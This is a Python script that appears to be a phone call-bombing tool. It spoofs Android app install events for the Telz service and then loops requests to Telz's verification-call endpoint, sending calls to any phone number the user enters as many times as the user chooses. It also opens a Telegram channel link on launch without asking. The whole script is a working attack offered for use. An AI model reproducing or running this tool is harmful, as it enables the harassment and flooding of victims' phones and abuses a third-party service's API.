import pyfiglet
from termcolor import colored
import requests
import json
import random
import string
import time
import uuid
import webbrowser
webbrowser.open('https://t.me/momilLinux')

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def send_install_request(url, headers, payload):
    try:
        response = requests.post(url, data=payload, headers=headers)
        if response.ok and "ok" in response.text:
            return True
        else:
            print(f"Install request failed: {response.json().get('status', 'Unknown error')}")
            return False
    except Exception as e:
        print(f"Error during install request: {e}")
        return False

def send_auth_call_request(url, headers, payload):
    try:
        response = requests.post(url, data=payload, headers=headers)
        if response.ok and "ok" in response.text:
            return True
        else:
            print(f"Auth call request failed: {response.json().get('status', 'Unknown error')}")
            return False
    except Exception as e:
        print(f"Error during auth call request: {e}")
        return False

def get_country_code():
    countries = {
        "1": ("Iraq", "+964"),
        "2": ("Syriaا", "+963"),
        "3": ("Egypt", "+20"),
    }
    
    print("")
    for key, value in countries.items():
        print(f"{key}: {value[0]}")

    choice = input("Choose your country code")
    if choice in countries:
        return countries[choice][1]
    else:
        print("Select wrong")
        

if __name__ == "__main__":
   
    moamel_art = """

tSS ..t;;;;:.X8%.                     
                 .  8@:Xt8S%tttt%8: X %8  .                 
                .8.8:8;. .:: .. .    X8:X:8                 
              ..X:8.  .  SXS8 .        .;8:@:               
             :@;X..     .:; t           .t.tSSS.            
            8S;%..       :. 8..           ..t:t8:.          
           :%8:.    %....:. 8;.....%        ::8t;           
        . 8:8;     .;;t..8. ;;8S;8t.         .:8.8.         
         %%:        ::;t::S X;%t;..           :.:X;.        
       . .t:         . ..:8t@..... .          ...%;;        
        ; @              .S @:t:8:.8            .8 t        
      . 8 X             ..; :SS:.%t;S8..         t.8;.      
      .::t:              :. 8S%%t::@ %%.        ..tt .      
      . 8%:             .:. X:.....tt 8..         t8..      
        8 %.             :: 8:..   %::8:.        ::8..      
       :% 8.            .:. @..  . ; St:       . 8:t.       
       ..:S;             :;tX..   ;;:S;        ..;S:        
       .:8.8:.           :88:   . : %.          @ @         
         .:%S:           ...     @ tt         .%tX          
           ;%.                 ..: @:         .%%%          
          .S;S8:               . 8 t%.      .;%%@:          
           :%:@:; .             ..8@%;8;   ..S8:.           
              :% @...             .;;.: . SSSt:             
              :t8@;.:              ....;8.@8:.              
              . ..X:.S:X8X;.     .%88 %;;S..                
                 ...;t8 . :%%:t%%  t @.:..                  
                    ..:..t88@88888%%.   

                
    """
    print(colored(moamel_art, "blue"))

    print(colored(" Choose a country number:", "yellow", attrs=["bold"]))
    print(colored(":-@USV_W ", "magenta", attrs=["bold", "underline"]))
    print()

    country_code = get_country_code()
    number = input(colored("Enter the number without spaces  ", "green", attrs=["bold"]))
    repeat_count = int(input(colored("The number of messages is recommended by 1:", "green", attrs=["bold"])))

    foxx, fox, foxer = generate_unique_ids()

    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"

    headers = {
        'User-Agent': "Telz-Android/17.5.17",
        'Content-Type': "application/json"
    }

    payload_install = json.dumps({
        "android_id": fox,
        "app_version": "17.5.17",
        "event": "install",
        "google_exists": "yes",
        "os": "android",
        "os_version": "9",
        "play_market": True,
        "ts": foxx,
        "uuid": str(foxer)
    })

    for i in range(repeat_count):
        if send_install_request(install_url, headers, payload_install):
            payload_auth_call = json.dumps({
                "android_id": fox,
                "app_version": "17.5.17",
                "attempt": "0",
                "event": "auth_call",
                "lang": "ar",
                "os": "android",
                "os_version": "9",
                "phone": f"{country_code}{number}",
                "ts": foxx,
                "uuid": str(foxer)
            })

            if send_auth_call_request(auth_call_url, headers, payload_auth_call):
                print(colored(f" {i + 1}/{repeat_count} Successful call() ", "green"))
            else:
                print(colored(f"The attempt failed {i + 1}/{repeat_count} Error please enter correct.", "yellow"))
        else:
            print(colored(f"Installation failed {i + 1}/{repeat_count}.", "red"))

        time.sleep(2)
